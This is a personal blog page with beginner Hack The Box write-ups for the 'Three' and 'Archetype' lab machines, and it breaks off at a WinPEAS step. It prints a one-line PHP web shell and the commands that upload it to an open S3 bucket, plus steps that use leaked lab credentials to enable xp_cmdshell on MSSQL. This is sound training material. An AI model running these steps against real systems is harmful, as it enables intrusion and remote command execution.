voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat.»</p>
<h3 id="three"><!-- raw HTML omitted -->DONE<!-- raw HTML omitted --> HTB-Three<a href="#three" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>

  <figure class="left" >
    <img src="/ox-hugo/three.png"   />
    
  </figure>


<h4 id="introduction">Introduction<a href="#introduction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Hi everyone,</p>
<p>this is my first HTB-writeup. It is about the starting
point machine <strong>three</strong>, which is made for beginners.
I think that many people could find this walkthrough
usefull if they are just starting with penetration-testing.</p>
<p>Enjoy.</p>
<h4 id="connect-to-htb">Connect to htb<a href="#connect-to-htb" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>To connect to your hack the box account, you need <strong>openvpn</strong>.
You can install it easily using the following comand:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install openvpn
</code></pre></div><p>After that, you have to download the .ovpn file from the
htb website. Click on &ldquo;connect to htb&rdquo;, then click on &ldquo;Starting Point&rdquo;.
Select &ldquo;TCP&rdquo; as protocol and just download the file.</p>
<p>Now you are ready to connect using the following comand:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo openvpn &lt;filename.ovpn&gt;
</code></pre></div><h4 id="preparation">Preparation<a href="#preparation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>After you connected to htb using <strong>openvpn</strong>, you can
<strong>spawn the machine</strong> by clicking on the yellow button.</p>

  <figure class="left" >
    <img src="/ox-hugo/spawn.png"   />
    
  </figure>


<p>Now the IP adress of the machine should pop up.
It is really important to save it in your /etc/hosts file.
You can do it by adding the following line to the file:</p>
<pre tabindex="0"><code class="language-example" data-lang="example">&lt;ip_addr&gt;    three
</code></pre><p>Now you can test if the host is up and running.</p>
<p>Just use the <strong>ping</strong> command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ping three
</code></pre></div><h4 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>As it&rsquo;s well known, to begin a penetration test it is always
important to scan the target. I generally use <strong>nmap</strong> with a couple
of flags, as shown below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV three
</code></pre></div><p>This basic scan will launch a series of default scripts and
will provide more information on the versions of the services
that are running on open ports. Here&rsquo;s the output that I got:</p>
<pre tabindex="0"><code class="language-example" data-lang="example">Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-15 10:14 CEST
Nmap scan report for three (10.129.101.217)
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.69 seconds
</code></pre><p>We can notice that an Apache server is running on port 80.
Let&rsquo;s try to navigate to <a href="http://three:80">http://three:80</a> to see the website.
Always play around with the web-page to discover vulnerabilites.</p>

  <figure class="left" >
    <img src="/ox-hugo/thetoppers.png"   />
    
  </figure>


<p>As the hint says, let&rsquo;s edit our /etc/hosts file, editing
the line that we added before:</p>
<pre tabindex="0"><code class="language-example" data-lang="example">&lt;ip_addr&gt;    thetoppers.htb
</code></pre><h4 id="gobuster">Gobuster<a href="#gobuster" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Performing a in-depth search of hidden (non-protected) files
and resources of a website is often a good starting point
during a penetration test.
This time htb helps us, and suggests to perform a sub-domain
enumeration. To do that, we can use a really famous brute-force tool
called <strong>gobuster</strong>.
To do that, we first need a <em>wordlist</em> that gobuster can
use. You can find many wordlists on the internet, containing
the most common words and expressions used in subdomains, but
this time we will create our own wordlist.
Look carefully at the hint that htb gives:</p>

  <figure class="left" >
    <img src="/ox-hugo/hint.png"   />
    
  </figure>


<p>We can see that there&rsquo;s probably a 2-character combination
that we have to find before the url.</p>
<p>The simplest thing to do here is generating all the permutations of 2-character words.
(including lowercase letters and numeric characters from 1 to 9).
We can do that by using a tool called crunch (pre-installed on kali linux):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">crunch <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">2</span> abcdefghijklmnopqrstuvwxyz0123456789 &gt; output.txt
</code></pre></div><p>Now we are ready to use gobuster in vhost mode (it will look
for subdomains by visiting the generated URLs).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo gobuster vhost -u http://thetoppers.htb -w /home/matte/output.txt
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://thetoppers.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /home/matte/output.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/09/15 10:23:28 Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb (Status: 502) [Size: 424]

===============================================================
2022/09/15 10:23:47 Finished
===============================================================
</code></pre></div><p>Here&rsquo;s our hidden subdomain: <strong>s3.thetoopers.htb</strong>.
Let&rsquo;s add it to our /etc/hosts file, editing
the same line as before.
Here&rsquo;s how my /etc/hosts file looks after this edit:</p>
<pre tabindex="0"><code class="language-example" data-lang="example">127.0.0.1       localhost
127.0.1.1       kali
10.129.101.217  thetoppers.htb s3.thetoppers.htb
</code></pre><h4 id="aws">AWS<a href="#aws" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>This is what we get if we navigate to <a href="http://s3.thetoppers.htb">http://s3.thetoppers.htb</a>:</p>

  <figure class="left" >
    <img src="/ox-hugo/s3.png"   />
    
  </figure>


<p>The subdomain is running <strong>Amazon s3 (Simple Storage Service)</strong>, which is a web-based
cloud storage service. To interact with it, we can use
the <strong>aws</strong> command line interface, called <strong>awscli</strong>.
To access the <strong>buckets</strong> (&ldquo;folders&rdquo; containing files) that the server is hosting, we
should setup the credentials. Sometimes online
contents of this kind are not protected, and you can access them even
without knowing security keys or passwords.
Let&rsquo;s do it to see if this is the case.</p>
<p>Use the following command to open an interactive menu
to setup your credentials (you can type random words. If
you don&rsquo;t, the connection will not work properly).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws configure
</code></pre></div><p>What we can do now is try to see if we can list the buckets
that are hosted. We have to specify:</p>
<ol>
<li>The <strong>endpoint</strong>, that is the url where the s3 service is hosted;</li>
<li>The command that we want to use, in this case <strong>ls</strong>;</li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws --endpoint<span style="color:#f92672">=</span>http://s3.thetoppers.htb s3 ls
</code></pre></div><p>Here&rsquo;s the output that we get:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">2022-09-15 10:33:39 thetoppers.htb
</code></pre></div><p>which means that there is an actual bucket hosted there.
Let&rsquo;s try to list the content of that bucket, using
this command (in this case we have to specify that we want
to use the s3 protocol to get the objects inside that bucket):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws --endpoint<span style="color:#f92672">=</span>http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
</code></pre></div><p>Here&rsquo;s the output that we get:</p>
<pre tabindex="0"><code class="language-example" data-lang="example">			   PRE images/
2022-09-15 10:33:39          0 .htaccess
2022-09-15 10:33:39      11952 index.php
</code></pre><h4 id="php">PHP<a href="#php" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>The website is configured to run php files, so we might try
to inject php files somehow.
One thing we can try to do is uploading a php shell
in the bucket, by using the <strong>cp</strong> command, that takes
a local file as the input.
I wrote the most basic shell you can have in php, this
is the source code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>Otherwise, you can find many reverse shell on this website:  <a href="https://www.revshells.com/">https://www.revshells.com/</a>.</p>
<p>Down below you can see how you can copy a file inside a bucket, you simply use <strong>cp</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws --endpoint<span style="color:#f92672">=</span>http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
</code></pre></div><p>You can then re-run the list command to see that the shell was
succesfully uploaded.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">                           PRE images/
2022-09-15 10:33:39          0 .htaccess
2022-09-15 10:33:39      11952 index.php
2022-09-15 12:24:13         64 shell.php
</code></pre></div><h4 id="get-root-flag">Get root flag<a href="#get-root-flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Now that we injected the php file that the webserver
can process, we can send remote commands by
modifying and navigating to this URL:  <a href="http://thetoppers.htb/reverse.php?cmd">http://thetoppers.htb/reverse.php?cmd</a>=&lt;any_command&gt;.
For example, you can list the files in the bucket like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://thetoppers.htb/reverse.php?cmd=ls+../
</code></pre></div><p><strong><em>And there&rsquo;s the flag!</em></strong></p>
<p>To actually see the content of the flag.txt file you can send this command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://thetoppers.htb/reverse.php?cmd=cat+../flag.txt
</code></pre></div><p>If the web-browser redirects you to some other web page,
you can also use tools like <strong>wget</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget http://thetoppers.htb/reverse.php?cmd<span style="color:#f92672">=</span>cat+../flag.txt
</code></pre></div><blockquote>
<p>root flag: a980d99281a28d638ac68b9bf9453c2b</p>
</blockquote>
<h3 id="Archetype"><!-- raw HTML omitted -->DONE<!-- raw HTML omitted --> HTB-Archetype<a href="#Archetype" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>

  <figure class="left" >
    <img src="/ox-hugo/Archetype.png"   />
    
  </figure>


<hr>
<h4 id="introduction">Introduction<a href="#introduction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Hi everyone,</p>
<p>this is a full tutorial of the Starting Point machine &ldquo;Archetype&rdquo;
on hack the box. If you have any suggestion / correction please contact
me at <strong><a href="mailto:matteolugli18@gmail.com">matteolugli18@gmail.com</a></strong>.</p>
<p>I will enable comments soon.</p>
<p>Enjoy.</p>
<hr>
<h4 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>I always start htb boxes with nmap enumeration.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV Archetype
Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-09-21 18:40 CEST
Nmap scan report <span style="color:#66d9ef">for</span> Archetype <span style="color:#f92672">(</span>10.129.206.73<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.59s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">996</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server <span style="color:#ae81ff">2019</span> Standard <span style="color:#ae81ff">17763</span> microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server <span style="color:#ae81ff">2017</span> 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
| Not valid before: 2022-09-21T16:36:23
|_Not valid after:  2052-09-21T16:36:23
|_ssl-date: 2022-09-21T16:41:18+00:00; 0s from scanner time.
Service Info: OSs: Windows, Windows Server <span style="color:#ae81ff">2008</span> R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-09-21T16:41:11
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
| smb-os-discovery:
|   OS: Windows Server <span style="color:#ae81ff">2019</span> Standard <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2019</span> Standard 6.3<span style="color:#f92672">)</span>
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
|_  System time: 2022-09-21T09:41:10-07:00
| ms-sql-info:
|   10.129.206.73:1433:
|     Version:
|       name: Microsoft SQL Server <span style="color:#ae81ff">2017</span> RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server <span style="color:#ae81ff">2017</span>
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: <span style="color:#ae81ff">1433</span>
|_clock-skew: mean: 1h23m59s, deviation: 3h07m50s, median: 0s
</code></pre></div><ol>
<li>
<p><strong>msrpc, port 135</strong> (Microsoft Remote Procedure Call): it is a protocol that
enables one program to request a service from a program on
another computer. It works in direct comunication with other
network protocols (such as SMB or TCP) to make service requests on
a remote server.</p>
</li>
<li>
<p><strong>netbios-ssn, port 139</strong>:  netbios is a transportation layer that
works with file sharing protocols like SMB, to allow file sharing
on the same network.</p>
</li>
<li>
<p><strong>microsoft-ds, port 445</strong>: Later versions of SMB began to use
port 445 on top of a TCP stack. This allows SMB to work over
the internet.</p>
<p>More informations here <a href="https://www.varonis.com/blog/smb-port">https://www.varonis.com/blog/smb-port</a> if
you are interested.</p>
</li>
<li>
<p><strong>ms-sql-s, port 1443</strong>: just a microsoft sql-server.</p>
</li>
</ol>
<hr>
<h4 id="smb-client">SMB client<a href="#smb-client" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Given what we discovered during enumeration, the simplest thing to
try is connecting to the machine using SMB client.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient -N -L Archetype

     Sharename       Type      Comment
     ---------       ----      -------
     ADMIN$          Disk      Remote Admin
     backups         Disk
     C$              Disk      Default share
     IPC$            IPC       Remote IPC
</code></pre></div><ul>
<li><strong>-N</strong>: I used this flag to suppres the password prompt, because we don&rsquo;t
have an access password. This time we got lucky and listed all the
shares successfully.</li>
<li><strong>-L</strong>: this flag is used when you want to list all the services hosted
on a particular server.</li>
</ul>
<p>We notice the share called <strong>backups</strong>, which is the only non-admin share,
that we might be able to access. Let&rsquo;s do it using this command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient -N <span style="color:#ae81ff">\\\\</span>Archetype<span style="color:#ae81ff">\\</span>backups
smb: <span style="color:#ae81ff">\&gt;</span> ls
ls
  .                                   D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">20</span> 13:20:57 <span style="color:#ae81ff">2020</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">20</span> 13:20:57 <span style="color:#ae81ff">2020</span>
  prod.dtsConfig                     AR      <span style="color:#ae81ff">609</span>  Mon Jan <span style="color:#ae81ff">20</span> 13:23:02 <span style="color:#ae81ff">2020</span>

		<span style="color:#ae81ff">5056511</span> blocks of size 4096. <span style="color:#ae81ff">2616242</span> blocks available
</code></pre></div><p>Looks like there is a suspicious file: prod.dtsConfig.
Let&rsquo;s take a peek and check what&rsquo;s in there:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">get prod.dtsConfig

&lt;DTSConfiguration&gt;
    &lt;DTSConfigurationHeading&gt;
	&lt;DTSConfigurationFileInfo GeneratedBy<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;...&#34;</span> GeneratedFromPackageName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;...&#34;</span> GeneratedFromPackageID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;...&#34;</span> GeneratedDate<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;20.1.2019 10:01:34&#34;</span>/&gt;
    &lt;/DTSConfigurationHeading&gt;
    &lt;Configuration ConfiguredType<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Property&#34;</span> Path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\Package.Connections[Destination].Properties[ConnectionString]&#34;</span> ValueType<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;String&#34;</span>&gt;
	&lt;ConfiguredValue&gt;Data Source<span style="color:#f92672">=</span>.;Password<span style="color:#f92672">=</span>M3g4c0rp123;User ID<span style="color:#f92672">=</span>ARCHETYPE<span style="color:#ae81ff">\s</span>ql_svc;Initial Catalog<span style="color:#f92672">=</span>Catalog;Provider<span style="color:#f92672">=</span>SQLNCLI10.1;Persist Security Info<span style="color:#f92672">=</span>True;Auto Translate<span style="color:#f92672">=</span>False;&lt;/ConfiguredValue&gt;
    &lt;/Configuration&gt;
&lt;/DTSConfiguration&gt;
</code></pre></div><p>We found some unprotected credentials!</p>
<p><strong>Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc</strong>.</p>
<hr>
<h4 id="impacket">Impacket<a href="#impacket" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>A simple way to connect to the ms-sql server is using <strong>mssqlclient.py</strong>,
a really usefull tool when working with Windows network protocols.
It is part of the collection of python scripts called <strong>impacket</strong>.
You can find the download links here</p>
<p><a href="https://www.secureauth.com/labs/open-source-tools/impacket/">https://www.secureauth.com/labs/open-source-tools/impacket/</a></p>
<p>At the beginning I struggled with finding the documentation for this tool, so i just runned
the script with no options:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Impacket v0.9.24 - Copyright <span style="color:#ae81ff">2021</span> SecureAuth Corporation

usage: mssqlclient.py <span style="color:#f92672">[</span>-h<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-port PORT<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-db DB<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-windows-auth<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-debug<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-file FILE<span style="color:#f92672">]</span>
		      <span style="color:#f92672">[</span>-hashes LMHASH:NTHASH<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-no-pass<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-k<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-aesKey hex key<span style="color:#f92672">]</span>
		      <span style="color:#f92672">[</span>-dc-ip ip address<span style="color:#f92672">]</span>
		      target

TDS client implementation <span style="color:#f92672">(</span>SSL supported<span style="color:#f92672">)</span>.

positional arguments:
  target                <span style="color:#f92672">[[</span>domain/<span style="color:#f92672">]</span>username<span style="color:#f92672">[</span>:password<span style="color:#f92672">]</span>@<span style="color:#f92672">]</span>&lt;targetName or address&gt;

options:
  -h, --help            show this help message and exit
  -port PORT            target MSSQL port <span style="color:#f92672">(</span>default 1433<span style="color:#f92672">)</span>
  -db DB                MSSQL database instance <span style="color:#f92672">(</span>default None<span style="color:#f92672">)</span>
  -windows-auth         whether or not to use Windows Authentication <span style="color:#f92672">(</span>default False<span style="color:#f92672">)</span>
  -debug                Turn DEBUG output ON
  -file FILE            input file with commands to execute in the SQL shell
</code></pre></div><p>After a little bit i figured out the correct way to write the command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 mssqlclient.py Archetype/sql_svc@10.129.206.73 -windows-auth
&lt;client.py Archetype/sql_svc@10.129.206.73 -windows-auth
Impacket v0.9.24 - Copyright <span style="color:#ae81ff">2021</span> SecureAuth Corporation

Password:&lt;insert password&gt;
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Encryption required, switching to TLS
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>DATABASE<span style="color:#f92672">)</span>: Old Value: master, New Value: master
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>LANGUAGE<span style="color:#f92672">)</span>: Old Value: , New Value: us_english
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>PACKETSIZE<span style="color:#f92672">)</span>: Old Value: 4096, New Value: <span style="color:#ae81ff">16192</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>ARCHETYPE<span style="color:#f92672">)</span>: Line 1: Changed database context to <span style="color:#e6db74">&#39;master&#39;</span>.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>ARCHETYPE<span style="color:#f92672">)</span>: Line 1: Changed language setting to us_english.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ACK: Result: <span style="color:#ae81ff">1</span> - Microsoft SQL Server<span style="color:#ae81ff">\0\0</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">140</span> 3232<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
</code></pre></div><p>There we go, looks like we can send commands, so i tried
to run a simple query:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">SQL&gt; <span style="color:#66d9ef">select</span> name from sys.databases
master
tempdb
model
msdb
</code></pre></div><hr>
<h4 id="command-shell">Command Shell<a href="#command-shell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>I found out that there is a way to execute commands remotly if we have access
to a ms-sql server: we can use a <em>stored procedure</em> called <strong>xp_cmdshell</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;dir *.exe&#39;</span>;

[<span style="color:#f92672">-</span>] ERROR(ARCHETYPE): Line <span style="color:#ae81ff">1</span>: <span style="color:#66d9ef">SQL</span> Server blocked <span style="color:#66d9ef">access</span> <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">procedure</span> <span style="color:#e6db74">&#39;sys.xp_cmdshell&#39;</span>
<span style="color:#66d9ef">of</span> component <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> because this component <span style="color:#66d9ef">is</span> turned <span style="color:#66d9ef">off</span> <span style="color:#66d9ef">as</span> part <span style="color:#66d9ef">of</span> the <span style="color:#66d9ef">security</span> configuration <span style="color:#66d9ef">for</span> this server.
A <span style="color:#66d9ef">system</span> administrator can enable the use <span style="color:#66d9ef">of</span> <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> <span style="color:#66d9ef">by</span> <span style="color:#66d9ef">using</span> sp_configure.
<span style="color:#66d9ef">For</span> <span style="color:#66d9ef">more</span> information about enabling <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>,
<span style="color:#66d9ef">search</span> <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">SQL</span> Server Books Online.
</code></pre></div><p>Turns out that we don&rsquo;t have the permission to do that, because xp_cmdshell
is disabled in the configuration file. Let&rsquo;s try to follow the suggestion
given by the error prompt ('[&hellip;] <em>A system administrator can enable the use of &lsquo;xp_cmdshell&rsquo; by using sp_configure</em>.').</p>
<p>With a quick google search i found out the correct way of using <strong>sp_configure</strong> to
enable the shell. (Maybie we are lucky and we can do it without admin privileges).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>
sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>
[<span style="color:#f92672">*</span>] INFO(ARCHETYPE): Line <span style="color:#ae81ff">185</span>: Configuration <span style="color:#66d9ef">option</span> <span style="color:#e6db74">&#39;show advanced options&#39;</span> changed <span style="color:#66d9ef">from</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">to</span> <span style="color:#ae81ff">1</span>. Run the RECONFIGURE <span style="color:#66d9ef">statement</span> <span style="color:#66d9ef">to</span> install.
<span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> reconfigure
reconfigure
<span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> RECONFIGURE
RECONFIGURE
<span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">EXEC</span> sp_configure <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>
<span style="color:#66d9ef">EXEC</span> sp_configure <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>
[<span style="color:#f92672">*</span>] INFO(ARCHETYPE): Line <span style="color:#ae81ff">185</span>: Configuration <span style="color:#66d9ef">option</span> <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> changed <span style="color:#66d9ef">from</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">to</span> <span style="color:#ae81ff">1</span>. Run the RECONFIGURE <span style="color:#66d9ef">statement</span> <span style="color:#66d9ef">to</span> install.
<span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> RECONFIGURE
RECONFIGURE
</code></pre></div><p>We can now re-try to send the previous command (<em>EXEC xp_cmdshell &lsquo;dir *.exe&rsquo;;'</em>),
and we get a huge output. (It is not reported here, but all the executable files
in the cwd should be listed in your terminal).</p>
<hr>
<h4 id="winpeas">WinPEAS<a href="#winpeas" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Not sure what to do next, i followed htb suggestion and looked up at
the tool called <strong>Winpeas</strong>, a python script used to help attackers
with <em>privilege escalation</em> on windows machines.
